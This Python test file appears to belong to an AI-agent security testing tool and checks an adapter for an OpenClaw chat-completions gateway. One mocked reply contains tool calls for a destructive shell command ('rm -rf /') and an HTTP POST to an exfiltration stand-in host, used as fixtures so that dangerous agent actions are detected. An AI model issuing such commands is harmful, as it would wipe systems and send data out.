import json

import httpx
import pytest

from agentsec.adapters.openclaw_gateway import OpenClawGatewayAdapter


def _mock_transport(captured: list[dict]) -> httpx.MockTransport:
    def handler(request: httpx.Request) -> httpx.Response:
        captured.append({
            "url": str(request.url),
            "method": request.method,
            "json": json.loads(request.content),
            "headers": dict(request.headers),
        })
        body = {
            "id": "chatcmpl-1",
            "choices": [
                {"message": {"role": "assistant", "content": "I cannot help with that."}}
            ],
        }
        return httpx.Response(200, json=body)

    return httpx.MockTransport(handler)


@pytest.mark.asyncio
async def test_posts_to_v1_chat_completions_with_openclaw_body_shape():
    captured: list[dict] = []
    adapter = OpenClawGatewayAdapter(name="oc", base_url="http://oc.example.com")
    adapter._client_factory = lambda: httpx.AsyncClient(transport=_mock_transport(captured))

    resp = await adapter.send("hi", session_id="sess-1")

    assert len(captured) == 1
    req = captured[0]
    assert req["url"] == "http://oc.example.com/v1/chat/completions"
    assert req["method"] == "POST"
    assert req["json"] == {
        "model": "openclaw",
        "messages": [{"role": "user", "content": "hi"}],
        "stream": False,
        "metadata": {"session_id": "sess-1"},
    }
    assert resp.content == "I cannot help with that."
    assert resp.status_code == 200


@pytest.mark.asyncio
async def test_passes_authorization_header_when_provided():
    captured: list[dict] = []
    adapter = OpenClawGatewayAdapter(
        name="oc",
        base_url="http://oc.example.com",
        headers={"Authorization": "Bearer test-token"},
    )
    adapter._client_factory = lambda: httpx.AsyncClient(transport=_mock_transport(captured))

    await adapter.send("hi", session_id="s")

    assert captured[0]["headers"].get("authorization") == "Bearer test-token"


@pytest.mark.asyncio
async def test_extracts_openai_style_tool_calls_into_tool_events():
    """Stage C C1 fix: OpenAI-compatible `choices[0].message.tool_calls[*]` MUST
    surface as `AgentResponse.tool_events` so `tool_event_not_invoked` actually
    fires on real OpenClaw runs."""
    def handler(request: httpx.Request) -> httpx.Response:
        body = {
            "id": "chatcmpl-2",
            "choices": [
                {
                    "message": {
                        "role": "assistant",
                        "content": "running shell now",
                        "tool_calls": [
                            {
                                "id": "call_a",
                                "type": "function",
                                "function": {
                                    "name": "shell.exec",
                                    "arguments": '{"cmd": "rm -rf /"}',
                                },
                            },
                            {
                                "id": "call_b",
                                "type": "function",
                                "function": {
                                    "name": "http.post",
                                    "arguments": '{"url": "https://exfil.agentsec.test/upload"}',
                                },
                            },
                        ],
                    }
                }
            ],
        }
        return httpx.Response(200, json=body)

    adapter = OpenClawGatewayAdapter(name="oc", base_url="http://oc.example.com")
    adapter._client_factory = lambda: httpx.AsyncClient(transport=httpx.MockTransport(handler))

    resp = await adapter.send("do bad things", session_id="s")

    assert resp.tool_events == [
        {"tool": "shell.exec", "args": '{"cmd": "rm -rf /"}'},
        {"tool": "http.post", "args": '{"url": "https://exfil.agentsec.test/upload"}'},
    ]


@pytest.mark.asyncio
async def test_no_tool_calls_yields_empty_tool_events():
    """Default OpenAI replies without tool_calls → tool_events stays []."""
    captured: list[dict] = []
    adapter = OpenClawGatewayAdapter(name="oc", base_url="http://oc.example.com")
    adapter._client_factory = lambda: httpx.AsyncClient(transport=_mock_transport(captured))

    resp = await adapter.send("hi", session_id="s")
    assert resp.tool_events == []


@pytest.mark.asyncio
async def test_malformed_tool_calls_do_not_raise():
    """A malformed `tool_calls` entry (missing function/name) MUST NOT crash
    the adapter — OE-AUD2-002 says non-2xx and parse anomalies surface via
    `error`/empty fields, never as exceptions."""
    def handler(request: httpx.Request) -> httpx.Response:
        body = {
            "choices": [
                {
                    "message": {
                        "role": "assistant",
                        "content": "ok",
                        "tool_calls": [
                            {"id": "call_x", "type": "function"},  # no function
                            "not-a-dict",
                            {"function": {"arguments": "{}"}},  # no name
                        ],
                    }
                }
            ],
        }
        return httpx.Response(200, json=body)

    adapter = OpenClawGatewayAdapter(name="oc", base_url="http://oc.example.com")
    adapter._client_factory = lambda: httpx.AsyncClient(transport=httpx.MockTransport(handler))

    resp = await adapter.send("hi", session_id="s")
    # All three entries are skipped — no crashes, no spurious events.
    assert resp.tool_events == []
    assert resp.content == "ok"


@pytest.mark.asyncio
async def test_non_2xx_does_not_raise_and_populates_error():
    def handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(429, json={"error": "rate-limited"})

    adapter = OpenClawGatewayAdapter(name="oc", base_url="http://oc.example.com")
    adapter._client_factory = lambda: httpx.AsyncClient(transport=httpx.MockTransport(handler))

    resp = await adapter.send("hi", session_id="s")
    assert resp.status_code == 429
    assert resp.error and "429" in resp.error
